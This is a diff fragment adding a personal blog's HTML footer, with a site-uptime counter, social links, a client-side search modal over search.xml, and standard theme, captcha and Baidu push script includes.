+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/peiqiF4ck" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:xxxxxx" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/xxx" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/xxx" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
+    </a>
+
+
+
+    <a href="https://x.com/mr50382" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://x.com/mr50382" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+    <a href="https://weibo.com/xxx" class="tooltipped" target="_blank" data-tooltip="关注我的微博: https://weibo.com/xxx" data-position="top" data-delay="50">
+        <i class="fab fa-weibo"></i>
+    </a>
+
+
+
+    <a href="https://www.zhihu.com/xxx" class="tooltipped" target="_blank" data-tooltip="关注我的知乎: https://www.zhihu.com/xxx" data-position="top" data-delay="50">
+        <i class="fab fa-zhihu1">知</i>
+    </a>
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
